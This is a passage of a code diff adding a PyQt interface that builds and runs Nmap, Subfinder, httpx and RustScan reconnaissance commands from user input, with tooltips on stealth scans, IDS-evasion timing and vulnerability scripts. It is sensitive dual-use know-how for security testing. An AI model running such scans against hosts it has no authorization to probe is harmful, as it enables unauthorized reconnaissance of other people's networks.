+        """Creates a reusable, self-contained widget with all of Nmap's configuration options."""
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+        main_layout.setContentsMargins(0,0,0,0)
+
+        controls = {}
+
+        top_controls = QFrame()
+        top_controls.setObjectName("controlPanel")
+        top_controls.setStyleSheet("#controlPanel { border: 1px solid #444; border-radius: 8px; padding: 5px; }")
+        top_layout = QGridLayout(top_controls)
+
+        top_layout.addWidget(QLabel("Target(s):"), 0, 0)
+        controls['target_edit'] = QLineEdit("localhost"); controls['target_edit'].setToolTip("Enter one or more target hosts, separated by spaces.\nExamples:\n- scanme.nmap.org (hostname)\n- 192.168.1.1 (single IP)\n- 192.168.1.0/24 (CIDR block)\n- 10.0.0-5.1-254 (IP range)")
+        top_layout.addWidget(controls['target_edit'], 0, 1, 1, 3)
+
+        top_layout.addWidget(QLabel("Ports:"), 1, 0)
+        controls['ports_edit'] = QLineEdit(); controls['ports_edit'].setToolTip("Specify ports to scan.\nExamples:\n- 22,80,443 (comma-separated)\n- 1-1024 (range)\n- U:53,T:21-25,80 (specific protocols)\nLeave blank for Nmap's default (top 1000 TCP ports).")
+        controls['ports_edit'].setPlaceholderText("Default (top 1000)")
+        top_layout.addWidget(controls['ports_edit'], 1, 1, 1, 3)
+
+        controls['start_btn'] = QPushButton(QIcon("icons/search.svg"), " Start Scan")
+        controls['cancel_btn'] = QPushButton("Cancel"); controls['cancel_btn'].setEnabled(False)
+        controls['report_btn'] = QPushButton("Generate HTML Report"); controls['report_btn'].setEnabled(False)
+
+        top_layout.addWidget(controls['start_btn'], 0, 4)
+        top_layout.addWidget(controls['cancel_btn'], 1, 4)
+        top_layout.addWidget(controls['report_btn'], 0, 5, 2, 1)
+
+        presets_layout = QVBoxLayout()
+        controls['all_ports_btn'] = QPushButton("All Ports"); controls['all_ports_btn'].setToolTip("Set the port range to all 65535 ports.")
+        controls['super_complete_btn'] = QPushButton("Super Complete Scan"); controls['super_complete_btn'].setToolTip("Set options for a highly comprehensive scan (-sS -A -v -T4 -p 1-65535).")
+        presets_layout.addWidget(controls['all_ports_btn'])
+        presets_layout.addWidget(controls['super_complete_btn'])
+        top_layout.addLayout(presets_layout, 0, 6, 2, 1)
+        main_layout.addWidget(top_controls)
+
+        options_splitter = QSplitter(Qt.Orientation.Horizontal)
+        left_panel = QWidget(); left_layout = QVBoxLayout(left_panel)
+
+        controls['scan_type_box'] = QGroupBox("Scan Type")
+        scan_type_layout = QFormLayout(controls['scan_type_box'])
+        controls['scan_type_combo'] = QComboBox(); controls['scan_type_combo'].addItems(["SYN Stealth Scan (-sS)", "TCP Connect Scan (-sT)", "UDP Scan (-sU)", "FIN Scan (-sF)", "Xmas Scan (-sX)", "Null Scan (-sN)", "Ping Scan (-sn)"])
+        controls['scan_type_combo'].setToolTip("Select the Nmap scan type.\n- SYN Stealth Scan (-sS): Default & most popular. Requires root/admin.\n- TCP Connect Scan (-sT): More reliable, but easily logged. No root needed.\n- UDP Scan (-sU): Scans for open UDP ports.\n- FIN/Xmas/Null: Stealthy scans useful for firewall evasion.\n- Ping Scan (-sn): Disables port scanning. Only discovers if hosts are online.")
+        scan_type_layout.addRow(controls['scan_type_combo'])
+        left_layout.addWidget(controls['scan_type_box'])
+
+        controls['timing_box'] = QGroupBox("Timing Template")
+        timing_layout = QFormLayout(controls['timing_box'])
+        controls['timing_combo'] = QComboBox(); controls['timing_combo'].setToolTip("Adjusts timing parameters to be more or less aggressive.\n- T0 (Paranoid): Very slow, for IDS evasion.\n- T1 (Sneaky): Quite slow, for IDS evasion.\n- T2 (Polite): Slows down to consume less bandwidth.\n- T3 (Normal): Default speed.\n- T4 (Aggressive): Assumes a fast and reliable network.\n- T5 (Insane): Extremely aggressive; may sacrifice accuracy.")
+        controls['timing_combo'].addItems(["T0 (Paranoid)", "T1 (Sneaky)", "T2 (Polite)", "T3 (Normal)", "T4 (Aggressive)", "T5 (Insane)"])
+        controls['timing_combo'].setCurrentIndex(3)
+        timing_layout.addRow(controls['timing_combo'])
+        left_layout.addWidget(controls['timing_box'])
+        left_layout.addStretch()
+
+        right_panel = QWidget(); right_layout = QVBoxLayout(right_panel)
+        controls['detection_box'] = QGroupBox("Detection Options")
+        detection_grid = QGridLayout(controls['detection_box'])
+        controls['sv_check'] = QCheckBox("Service/Version (-sV)"); controls['sv_check'].setToolTip("Probe open ports to determine service and version info (-sV).\nThis is essential for vulnerability scanning and accurate service identification.")
+        controls['o_check'] = QCheckBox("OS Detection (-O)"); controls['o_check'].setToolTip("Enable OS detection (-O).\nAttempts to determine the operating system of the target.\nRequires root/administrator privileges.")
+        controls['sc_check'] = QCheckBox("Default Scripts (-sC)"); controls['sc_check'].setToolTip("Run a scan using the default set of safe Nmap scripts (-sC).\nEquivalent to --script=default.")
+        controls['a_check'] = QCheckBox("Aggressive Scan (-A)"); controls['a_check'].setToolTip("Enable Aggressive scan options (-A).\nThis is a convenient shortcut that enables OS detection (-O), version scanning (-sV), script scanning (-sC), and traceroute (--traceroute).\nIt is a comprehensive but noisy scan.")
+        detection_grid.addWidget(controls['sv_check'], 0, 0); detection_grid.addWidget(controls['o_check'], 0, 1)
+        detection_grid.addWidget(controls['sc_check'], 1, 0); detection_grid.addWidget(controls['a_check'], 1, 1)
+        right_layout.addWidget(controls['detection_box'])
+
+        controls['misc_box'] = QGroupBox("Miscellaneous Options")
+        misc_grid = QGridLayout(controls['misc_box'])
+        controls['pn_check'] = QCheckBox("No Ping (-Pn)"); controls['pn_check'].setToolTip("Treat all hosts as online (-Pn).\nThis skips the initial host discovery (ping sweep) phase, which is useful for scanning hosts that do not respond to ping probes or are on a firewalled network.")
+        controls['v_check'] = QCheckBox("Verbose (-v)"); controls['v_check'].setToolTip("Increase verbosity level (-v).\nProvides more information about the scan in progress.\nCan be used multiple times for more detail (e.g., -vv).")
+        controls['traceroute_check'] = QCheckBox("Traceroute (--traceroute)"); controls['traceroute_check'].setToolTip("Trace the network path (hops) to each host.\nUseful for mapping the network route to the target.")
+        misc_grid.addWidget(controls['pn_check'], 0, 0); misc_grid.addWidget(controls['v_check'], 0, 1)
+        misc_grid.addWidget(controls['traceroute_check'], 1, 0)
+        right_layout.addWidget(controls['misc_box'])
+        options_splitter.addWidget(left_panel); options_splitter.addWidget(right_panel)
+        main_layout.addWidget(options_splitter)
+
+        controls['nse_box'] = QGroupBox("Nmap Scripting Engine (NSE)")
+        nse_layout = QFormLayout(controls['nse_box'])
+        controls['preset_combo'] = QComboBox(); controls['preset_combo'].setToolTip("Select a common script preset to automatically fill the script fields below.")
+        controls['preset_combo'].addItems(["-- Select a Preset --"] + list(self.nmap_script_presets.keys()))
+        nse_layout.addRow("Script Presets:", controls['preset_combo'])
+
+        controls['nse_vuln_check'] = QCheckBox("Vulnerability scripts (`vuln`)"); controls['nse_vuln_check'].setToolTip("Run all scripts in the 'vuln' category.\nThese check for specific known vulnerabilities.\nRequires service version detection (-sV).")
+        controls['nse_discovery_check'] = QCheckBox("Discovery scripts (`discovery`)"); controls['nse_discovery_check'].setToolTip("Run all scripts in the 'discovery' category.\nThese actively probe for more information, such as registry details or service info.")
+        controls['nse_safe_check'] = QCheckBox("Safe scripts (`safe`)"); controls['nse_safe_check'].setToolTip("Run all scripts in the 'safe' category.\nThese are scripts that are not considered intrusive or likely to crash services.")
+        category_layout = QHBoxLayout(); category_layout.addWidget(controls['nse_vuln_check']); category_layout.addWidget(controls['nse_discovery_check']); category_layout.addWidget(controls['nse_safe_check'])
+        nse_layout.addRow("Categories:", category_layout)
+
+        controls['custom_script_edit'] = QLineEdit(); controls['custom_script_edit'].setPlaceholderText("e.g., http-title,smb-os-discovery"); controls['custom_script_edit'].setToolTip("A comma-separated list of Nmap scripts, directories, or categories to run.\nOverrides category checkboxes if specified.")
+        nse_layout.addRow("Custom Scripts:", controls['custom_script_edit'])
+        controls['script_args_edit'] = QLineEdit(); controls['script_args_edit'].setPlaceholderText("e.g., http.useragent=MyCustomAgent,user=admin"); controls['script_args_edit'].setToolTip("Provide arguments for your NSE scripts (e.g., http.useragent=MyCustomAgent,user=admin).\nSee Nmap documentation for script-specific arguments.")
+        nse_layout.addRow("Script Arguments:", controls['script_args_edit'])
+        controls['script_desc_label'] = QLabel("Description: --"); controls['script_desc_label'].setWordWrap(True); controls['script_desc_label'].setStyleSheet("color: #aaa; padding-top: 5px;")
+        nse_layout.addRow(controls['script_desc_label'])
+        main_layout.addWidget(controls['nse_box'])
+
+        return widget, controls
+
+    def _nmap_on_aggressive_toggled(self, checked):
+        controls = self.nmap_controls
+        controls['sv_check'].setDisabled(checked)
+        controls['o_check'].setDisabled(checked)
+        controls['sc_check'].setDisabled(checked)
+        controls['traceroute_check'].setDisabled(checked)
+
+    def _nmap_on_ping_scan_toggled(self, text):
+        controls = self.nmap_controls
+        is_ping_scan = (text == "Ping Scan (-sn)")
+        for w_key in ['detection_box', 'misc_box', 'ports_edit', 'timing_box', 'nse_box']:
+             controls[w_key].setDisabled(is_ping_scan)
+
+    def _nmap_set_all_ports(self):
+        """Sets the Nmap port text field to scan all ports."""
+        self.nmap_controls['ports_edit'].setText("1-65535")
+
+    def _handle_nmap_preset_selected(self, preset_name):
+        """Populates the script fields based on the selected Nmap preset."""
+        controls = self.nmap_controls
+        if preset_name == "-- Select a Preset --":
+            controls['custom_script_edit'].clear()
+            controls['script_args_edit'].clear()
+            controls['script_desc_label'].setText("Description: --")
+            return
+
+        scripts, args, desc = self.nmap_script_presets.get(preset_name, ("", "", "No description available."))
+        controls['custom_script_edit'].setText(scripts)
+        controls['script_args_edit'].setText(args)
+        controls['script_desc_label'].setText(f"Description: {desc}")
+
+    def _nmap_toggle_super_complete(self):
+        """Toggles the 'Super Complete Scan' preset."""
+        controls = self.nmap_controls
+        if not self.super_scan_active:
+            controls['ports_edit'].setText("1-65535")
+            controls['scan_type_combo'].setCurrentText("SYN Stealth Scan (-sS)")
+            controls['timing_combo'].setCurrentText("T4 (Aggressive)")
+            controls['a_check'].setChecked(True)
+            controls['v_check'].setChecked(True)
+
+            target = controls['target_edit'].text() or "[target]"
+            command_preview = self._build_nmap_command_preview(target)
+            self.nmap_output_console.clear()
+            self.nmap_output_console.setPlainText(f"# Preset command preview:\n$ {command_preview}")
+            QMessageBox.information(self, "Preset Loaded", "Super Complete Scan options have been set.\nClick 'Start Scan' to run, or click the preset button again to cancel.")
+
+            controls['super_complete_btn'].setText("Cancel Super Scan")
+            self.super_scan_active = True
+        else:
+            controls['ports_edit'].setText("")
+            controls['scan_type_combo'].setCurrentIndex(0)
+            controls['timing_combo'].setCurrentIndex(3)
+            controls['a_check'].setChecked(False)
+            controls['v_check'].setChecked(False)
+
+            controls['super_complete_btn'].setText("Super Complete Scan")
+            self.nmap_output_console.clear()
+            self.super_scan_active = False
+
+    def _build_nmap_script_args(self):
+        """Builds the --script and --script-args parts of the nmap command."""
+        controls = self.nmap_controls
+        script_parts = []
+
+        if controls['sc_check'].isChecked():
+            script_parts.append("default")
+        if controls['nse_vuln_check'].isChecked():
+            script_parts.append("vuln")
+        if controls['nse_discovery_check'].isChecked():
+            script_parts.append("discovery")
+        if controls['nse_safe_check'].isChecked():
+            script_parts.append("safe")
+        if custom_scripts := controls['custom_script_edit'].text().strip():
+            script_parts.append(custom_scripts)
+
+        command_args = []
+        if script_parts:
+            unique_scripts = sorted(list(set(script_parts)))
+            command_args.extend(["--script", ",".join(unique_scripts)])
+        if script_args := controls['script_args_edit'].text().strip():
+            command_args.extend(["--script-args", script_args])
+
+        return command_args
+
+    def _build_nmap_command_preview(self, target):
+        """Helper to build a command string for preview purposes."""
+        controls = self.nmap_controls
+        command = ["nmap"]
+        command.append(controls['scan_type_combo'].currentText().split(" ")[-1].strip("()"))
+        command.append("-T" + controls['timing_combo'].currentText()[1])
+        if controls['a_check'].isChecked(): command.append("-A")
+        if controls['v_check'].isChecked(): command.append("-v")
+        if controls['pn_check'].isChecked(): command.append("-Pn")
+        if ports := controls['ports_edit'].text():
+            command.extend(["-p", ports])
+        command.extend(self._build_nmap_script_args())
+        command.append(target)
+        return " ".join(command)
+
+    def start_nmap_scan(self):
+        """Starts the Nmap scan worker thread by building a command from the UI."""
+        controls = self.nmap_controls
+        if not shutil.which("nmap"):
+            QMessageBox.critical(self, "Nmap Error", "'nmap' command not found. Please ensure it is installed and in your system's PATH.")
+            return
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+        target = controls['target_edit'].text()
+        if not target:
+            QMessageBox.critical(self, "Input Error", "Please provide a target for the Nmap scan.")
+            return
+
+        command = ["nmap"]
+        command.append(controls['scan_type_combo'].currentText().split(" ")[-1].strip("()"))
+        command.append("-T" + controls['timing_combo'].currentText()[1])
+
+        if controls['a_check'].isChecked():
+            command.append("-A")
+        else:
+            if controls['sv_check'].isChecked(): command.append("-sV")
+            if controls['o_check'].isChecked(): command.append("-O")
+            if controls['traceroute_check'].isChecked(): command.append("--traceroute")
+
+        if controls['pn_check'].isChecked(): command.append("-Pn")
+        if controls['v_check'].isChecked(): command.append("-v")
+
+        if controls['ports_edit'].isEnabled():
+            if ports := controls['ports_edit'].text():
+                command.extend(["-p", ports])
+            else:
+                command.extend(["--top-ports", "1024"])
+
+        command.extend(self._build_nmap_script_args())
+
+        try:
+            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix=".xml", encoding='utf-8') as tmp_xml:
+                self.nmap_xml_temp_file = tmp_xml.name
+            command.extend(["-oX", self.nmap_xml_temp_file])
+        except Exception as e:
+            QMessageBox.critical(self, "File Error", f"Could not create temporary file for Nmap report: {e}")
+            return
+
+        command.append(target)
+
+        self.is_tool_running = True
+        controls['start_btn'].setEnabled(False)
+        controls['cancel_btn'].setEnabled(True)
+        controls['report_btn'].setEnabled(False)
+        self.tool_stop_event.clear()
+        self.nmap_output_console.clear()
+
+        self.worker = WorkerThread(_nmap_scan_thread, args=(self, command,))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def generate_nmap_report(self):
+        """Saves the Nmap XML and generates a styled HTML report using lxml."""
+        if not self.nmap_last_xml:
+            QMessageBox.information(self, "No Data", "Please run an Nmap scan first to generate data for the report.")
+            return
+
+        if not LXML_AVAILABLE:
+            QMessageBox.critical(self, "Dependency Error", "The 'lxml' library is required for HTML report generation. Please install it using 'pip install lxml'.")
+            return
+
+        save_path, _ = QFileDialog.getSaveFileName(self, "Save Nmap HTML Report", "nmap_report.html", "HTML Files (*.html);;XML Files (*.xml)", options=QFileDialog.Option.DontUseNativeDialog)
+        if not save_path:
+            return
+
+        try:
+            # Always save the raw XML data first
+            if save_path.endswith('.html'):
+                xml_path = os.path.splitext(save_path)[0] + ".xml"
+            else:
+                xml_path = save_path
+
+            with open(xml_path, 'w', encoding='utf-8') as f:
+                f.write(self.nmap_last_xml)
+
+            # If the user wants HTML, perform the transformation
+            if save_path.endswith('.html'):
+                # Use a parser that can recover from errors, which can happen with Nmap's XML
+                parser = etree.XMLParser(recover=True)
+                xml_doc = etree.fromstring(self.nmap_last_xml.encode('utf-8'), parser=parser)
+
+                # Check for the stylesheet file
+                xsl_path = "nmap-bootstrap.xsl"
+                if not os.path.exists(xsl_path):
+                    QMessageBox.critical(self, "File Not Found", f"Stylesheet '{xsl_path}' not found. Make sure it is in the same directory as the application.")
+                    return
+
+                xsl_doc = etree.parse(xsl_path)
+                transform = etree.XSLT(xsl_doc)
+                html_doc = transform(xml_doc)
+
+                with open(save_path, 'wb') as f:
+                    f.write(etree.tostring(html_doc, pretty_print=True))
+
+            QMessageBox.information(self, "Report Saved", f"Report successfully saved to:\n{os.path.realpath(save_path)}")
+
+        except Exception as e:
+            logging.error(f"Failed to generate or save Nmap report: {e}", exc_info=True)
+            QMessageBox.critical(self, "Report Generation Error", f"An unexpected error occurred:\n{e}")
+
+
+    def _create_subfinder_tool(self):
+        """Creates the UI for the Subfinder tool."""
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+
+        config_widget, self.subfinder_controls = self._create_subfinder_config_widget()
+        layout.addWidget(config_widget)
+
+        # --- Action Buttons ---
+        buttons_layout = QHBoxLayout()
+        buttons_layout.addWidget(self.subfinder_controls['start_btn'])
+        buttons_layout.addWidget(self.subfinder_controls['cancel_btn'])
+        layout.addLayout(buttons_layout)
+
+        # --- Output Console ---
+        self.subfinder_output = QPlainTextEdit()
+        self.subfinder_output.setReadOnly(True)
+        self.subfinder_output.setFont(QFont("Courier New", 10))
+        self.subfinder_output.setPlaceholderText("Subfinder output will be displayed here...")
+        layout.addWidget(self.subfinder_output, 1)
+
+        self.subfinder_controls['start_btn'].clicked.connect(self.start_subfinder_scan)
+        self.subfinder_controls['cancel_btn'].clicked.connect(self.cancel_tool)
+
+        return widget
+
+    def _create_subfinder_config_widget(self):
+        """Creates a reusable, self-contained widget for the Subfinder scanner's configuration."""
+        widget = QFrame()
+        widget.setObjectName("controlPanel")
+        widget.setStyleSheet("#controlPanel { border: 1px solid #444; border-radius: 8px; padding: 5px; }")
+        layout = QFormLayout(widget)
+
+        controls = {}
+
+        controls['domain_edit'] = QLineEdit("example.com")
+        controls['domain_edit'].setToolTip("Enter the target domain to enumerate subdomains for (-d).")
+        layout.addRow("Domain:", controls['domain_edit'])
+
+        controls['recursive_check'] = QCheckBox("Recursive Scan")
+        controls['recursive_check'].setToolTip("Enable recursive subdomain discovery (-recursive).")
+        layout.addRow(controls['recursive_check'])
+
+        controls['all_sources_check'] = QCheckBox("Use All Sources")
+        controls['all_sources_check'].setToolTip("Use all available sources for enumeration (-all).")
+        layout.addRow(controls['all_sources_check'])
+
+        output_file_layout = QHBoxLayout()
+        controls['output_edit'] = QLineEdit()
+        controls['output_edit'].setPlaceholderText("Optional: path to save results...")
+        output_file_layout.addWidget(controls['output_edit'])
+        browse_output_btn = QPushButton("Browse...")
+        browse_output_btn.clicked.connect(lambda: self._browse_save_file_for_lineedit(controls['output_edit'], "Save Subfinder Results"))
+        output_file_layout.addWidget(browse_output_btn)
+        layout.addRow("Output File (-o):", output_file_layout)
+
+        controls['start_btn'] = QPushButton(QIcon("icons/search.svg"), " Start Scan")
+        controls['cancel_btn'] = QPushButton("Cancel")
+        controls['cancel_btn'].setEnabled(False)
+
+        return widget, controls
+
+    def start_subfinder_scan(self):
+        """Starts the Subfinder scan worker thread."""
+        controls = self.subfinder_controls
+        if not shutil.which("subfinder"):
+            QMessageBox.critical(self, "Subfinder Error", "'subfinder' command not found. Please ensure it is installed and in your system's PATH.")
+            return
+
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        domain = controls['domain_edit'].text().strip()
+        if not domain:
+            QMessageBox.critical(self, "Input Error", "Please provide a domain to scan.")
+            return
+
+        command = ["subfinder", "-d", domain, "-silent"]
+
+        if controls['recursive_check'].isChecked():
+            command.append("-recursive")
+
+        if controls['all_sources_check'].isChecked():
+            command.append("-all")
+
+        if output_file := controls['output_edit'].text().strip():
+            command.extend(["-o", output_file])
+
+        self.is_tool_running = True
+        controls['start_btn'].setEnabled(False)
+        controls['cancel_btn'].setEnabled(True)
+        self.tool_stop_event.clear()
+        self.subfinder_output.clear()
+
+        self.worker = WorkerThread(_subfinder_thread, args=(self, command,))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _subfinder_thread(self, command):
+        """Worker thread for running the subfinder command."""
+        q = self.tool_results_queue
+        logging.info(f"Starting Subfinder with command: {' '.join(command)}")
+        q.put(('subfinder_output', f"$ {' '.join(command)}\n\n"))
+
+        try:
+            startupinfo = None
+            if sys.platform == "win32":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, startupinfo=startupinfo, encoding='utf-8', errors='replace')
+
+            with self.thread_finish_lock:
+                self.subfinder_process = process
+
+            full_output = []
+            for line in iter(process.stdout.readline, ''):
+                if self.tool_stop_event.is_set():
+                    process.terminate()
+                    q.put(('subfinder_output', "\n\n--- Scan Canceled By User ---\n"))
+                    break
+                q.put(('subfinder_output', line))
+                full_output.append(line.strip())
+
+            process.stdout.close()
+            process.wait()
+
+            if not self.tool_stop_event.is_set():
+                domain = ""
+                for i, arg in enumerate(command):
+                    if arg == '-d' and i + 1 < len(command):
+                        domain = command[i+1]
+                        break
+                results = [line for line in full_output if domain in line and ' ' not in line and not line.startswith('$')]
+                q.put(('subdomain_results', domain, results))
+
+        except FileNotFoundError:
+            q.put(('error', 'Subfinder Error', "'subfinder' command not found. Please ensure it is installed and in your system's PATH."))
+        except Exception as e:
+            logging.error(f"Subfinder thread error: {e}", exc_info=True)
+            q.put(('error', 'Subfinder Error', str(e)))
+        finally:
+            q.put(('tool_finished', 'subfinder_scan'))
+            with self.thread_finish_lock:
+                self.subfinder_process = None
+            logging.info("Subfinder scan thread finished.")
+
+    def _handle_subfinder_output(self, line):
+        self.subfinder_output.insertPlainText(line)
+        self.subfinder_output.verticalScrollBar().setValue(self.subfinder_output.verticalScrollBar().maximum())
+
+    def _create_httpx_tool(self):
+        """Creates the UI for the httpx tool."""
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+
+        config_widget, self.httpx_controls = self._create_httpx_config_widget()
+        layout.addWidget(config_widget)
+
+        # --- Action Buttons ---
+        buttons_layout = QHBoxLayout()
+        buttons_layout.addWidget(self.httpx_controls['start_btn'])
+        buttons_layout.addWidget(self.httpx_controls['cancel_btn'])
+        layout.addLayout(buttons_layout)
+
+        # --- Output Console ---
+        self.httpx_output = QPlainTextEdit()
+        self.httpx_output.setReadOnly(True)
+        self.httpx_output.setFont(QFont("Courier New", 10))
+        self.httpx_output.setPlaceholderText("httpx output will be displayed here...")
+        layout.addWidget(self.httpx_output, 1)
+
+        self.httpx_controls['start_btn'].clicked.connect(self.start_httpx_scan)
+        self.httpx_controls['cancel_btn'].clicked.connect(self.cancel_tool)
+
+        return widget
+
+    def _create_httpx_config_widget(self):
+        """Creates a reusable, self-contained widget for the httpx scanner's configuration."""
+        widget = QFrame()
+        widget.setObjectName("controlPanel")
+        widget.setStyleSheet("#controlPanel { border: 1px solid #444; border-radius: 8px; padding: 5px; }")
+        main_layout = QVBoxLayout(widget)
+        controls = {}
+
+        # --- Top Row: Target List ---
+        top_layout = QFormLayout()
+        target_file_layout = QHBoxLayout()
+        controls['target_list_edit'] = QLineEdit()
+        controls['target_list_edit'].setPlaceholderText("Path to a file with hosts/URLs (one per line)...")
+        controls['target_list_edit'].setToolTip("A file containing a list of targets to probe (-l).")
+        target_file_layout.addWidget(controls['target_list_edit'])
+        browse_target_btn = QPushButton("Browse...")
+        browse_target_btn.clicked.connect(lambda: self._browse_file_for_lineedit(controls['target_list_edit'], "Select Target List File"))
+        target_file_layout.addWidget(browse_target_btn)
+        top_layout.addRow("Target List (-l):", target_file_layout)
+        main_layout.addLayout(top_layout)
+
+        # --- Middle Row: Probes ---
+        probes_box = QGroupBox("Probes to Run")
+        probes_layout = QGridLayout(probes_box)
+        controls['probe_status_code'] = QCheckBox("Status Code"); controls['probe_status_code'].setChecked(True)
+        controls['probe_title'] = QCheckBox("Title"); controls['probe_title'].setChecked(True)
+        controls['probe_tech_detect'] = QCheckBox("Tech Detect")
+        controls['probe_web_server'] = QCheckBox("Web Server")
+        controls['probe_cdn'] = QCheckBox("CDN")
+        controls['probe_jarm'] = QCheckBox("JARM Hash")
+        probes_layout.addWidget(controls['probe_status_code'], 0, 0)
+        probes_layout.addWidget(controls['probe_title'], 0, 1)
+        probes_layout.addWidget(controls['probe_tech_detect'], 0, 2)
+        probes_layout.addWidget(controls['probe_web_server'], 1, 0)
+        probes_layout.addWidget(controls['probe_cdn'], 1, 1)
+        probes_layout.addWidget(controls['probe_jarm'], 1, 2)
+        main_layout.addWidget(probes_box)
+
+        # --- Bottom Row: Other Options ---
+        bottom_layout = QFormLayout()
+        controls['ports_edit'] = QLineEdit()
+        controls['ports_edit'].setPlaceholderText("e.g., 80,443,8080 (optional)")
+        controls['ports_edit'].setToolTip("Comma-separated list of ports to scan (-ports).")
+        bottom_layout.addRow("Ports (-ports):", controls['ports_edit'])
+
+        controls['json_output_check'] = QCheckBox("JSON Output (-json)")
+        controls['json_output_check'].setToolTip("Output results in JSON format.")
+        bottom_layout.addRow(controls['json_output_check'])
+
+        main_layout.addLayout(bottom_layout)
+
+        controls['start_btn'] = QPushButton(QIcon("icons/search.svg"), " Start Probing")
+        controls['cancel_btn'] = QPushButton("Cancel"); controls['cancel_btn'].setEnabled(False)
+
+        return widget, controls
+
+    def start_httpx_scan(self):
+        """Starts the httpx scan worker thread."""
+        controls = self.httpx_controls
+        if not shutil.which("httpx"):
+            QMessageBox.critical(self, "httpx Error", "'httpx' command not found. Please ensure it is installed and in your system's PATH.")
+            return
+
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        target_list = controls['target_list_edit'].text().strip()
+        if not target_list:
+            QMessageBox.critical(self, "Input Error", "Please provide a target list file.")
+            return
+
+        command = ["httpx", "-l", target_list, "-silent"]
+
+        probe_flags = {
+            'probe_status_code': '-status-code',
+            'probe_title': '-title',
+            'probe_tech_detect': '-tech-detect',
+            'probe_web_server': '-web-server',
+            'probe_cdn': '-cdn',
+            'probe_jarm': '-jarm',
+        }
+        for control_name, flag in probe_flags.items():
+            if controls[control_name].isChecked():
+                command.append(flag)
+
+        if ports := controls['ports_edit'].text().strip():
+            command.extend(["-ports", ports])
+
+        if controls['json_output_check'].isChecked():
+            command.append("-json")
+
+        self.is_tool_running = True
+        controls['start_btn'].setEnabled(False)
+        controls['cancel_btn'].setEnabled(True)
+        self.tool_stop_event.clear()
+        self.httpx_output.clear()
+
+        self.worker = WorkerThread(_httpx_thread, args=(self, command,))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _httpx_thread(self, command):
+        """Worker thread for running the httpx command."""
+        q = self.tool_results_queue
+        logging.info(f"Starting httpx with command: {' '.join(command)}")
+        q.put(('httpx_output', f"$ {' '.join(command)}\n\n"))
+
+        try:
+            startupinfo = None
+            if sys.platform == "win32":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, startupinfo=startupinfo, encoding='utf-8', errors='replace')
+
+            with self.thread_finish_lock:
+                self.httpx_process = process
+
+            full_output = []
+            for line in iter(process.stdout.readline, ''):
+                if self.tool_stop_event.is_set():
+                    process.terminate()
+                    q.put(('httpx_output', "\n\n--- Scan Canceled By User ---\n"))
+                    break
+                q.put(('httpx_output', line))
+                full_output.append(line)
+
+            process.stdout.close()
+            process.wait()
+
+            if not self.tool_stop_event.is_set() and "-json" in command:
+                json_data = "".join(full_output)
+                q.put(('httpx_results', json_data))
+
+        except FileNotFoundError:
+            q.put(('error', 'httpx Error', "'httpx' command not found. Please ensure it is installed and in your system's PATH."))
+        except Exception as e:
+            logging.error(f"httpx thread error: {e}", exc_info=True)
+            q.put(('error', 'httpx Error', str(e)))
+        finally:
+            q.put(('tool_finished', 'httpx_scan'))
+            with self.thread_finish_lock:
+                self.httpx_process = None
+            logging.info("httpx scan thread finished.")
+
+    def _handle_httpx_output(self, line):
+        self.httpx_output.insertPlainText(line)
+        self.httpx_output.verticalScrollBar().setValue(self.httpx_output.verticalScrollBar().maximum())
+
+    def _create_rustscan_tool(self):
+        """Creates the UI for the RustScan tool."""
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+
+        config_widget, self.rustscan_controls = self._create_rustscan_config_widget()
+        layout.addWidget(config_widget)
+
+        # --- Action Buttons ---
+        buttons_layout = QHBoxLayout()
+        buttons_layout.addWidget(self.rustscan_controls['start_btn'])
+        buttons_layout.addWidget(self.rustscan_controls['cancel_btn'])
+        layout.addLayout(buttons_layout)
+
+        # --- Output Console ---
+        self.rustscan_output = QPlainTextEdit()
+        self.rustscan_output.setReadOnly(True)
+        self.rustscan_output.setFont(QFont("Courier New", 10))
+        self.rustscan_output.setPlaceholderText("RustScan and Nmap output will be displayed here...")
+        layout.addWidget(self.rustscan_output, 1)
+
+        self.rustscan_controls['start_btn'].clicked.connect(self.start_rustscan_scan)
+        self.rustscan_controls['cancel_btn'].clicked.connect(self.cancel_tool)
+
+        return widget
+
+    def _create_rustscan_config_widget(self):
+        """Creates a reusable, self-contained widget for the RustScan tool's configuration."""
+        widget = QFrame()
+        widget.setObjectName("controlPanel")
+        widget.setStyleSheet("#controlPanel { border: 1px solid #444; border-radius: 8px; padding: 5px; }")
+        layout = QFormLayout(widget)
+
+        controls = {}
+
+        controls['targets_edit'] = QLineEdit("localhost")
+        controls['targets_edit'].setToolTip("A single target or a comma-separated list of targets (e.g., 127.0.0.1, scanme.nmap.org).")
+        layout.addRow("Targets (-a):", controls['targets_edit'])
+
+        controls['ports_edit'] = QLineEdit("1-1000")
+        controls['ports_edit'].setToolTip("A comma-separated list of ports or a range (e.g., 22,80,443 or 1-1024).")
+        layout.addRow("Ports (-p):", controls['ports_edit'])
+
+        controls['batch_size_edit'] = QLineEdit("4500")
+        controls['batch_size_edit'].setToolTip("The number of ports to scan at once (-b).")
+        layout.addRow("Batch Size (-b):", controls['batch_size_edit'])
+
+        controls['timeout_edit'] = QLineEdit("1500")
+        controls['timeout_edit'].setToolTip("The timeout in milliseconds for each port (-T).")
+        layout.addRow("Timeout (-T):", controls['timeout_edit'])
+
+        controls['nmap_args_edit'] = QLineEdit("-sV -sC -A")
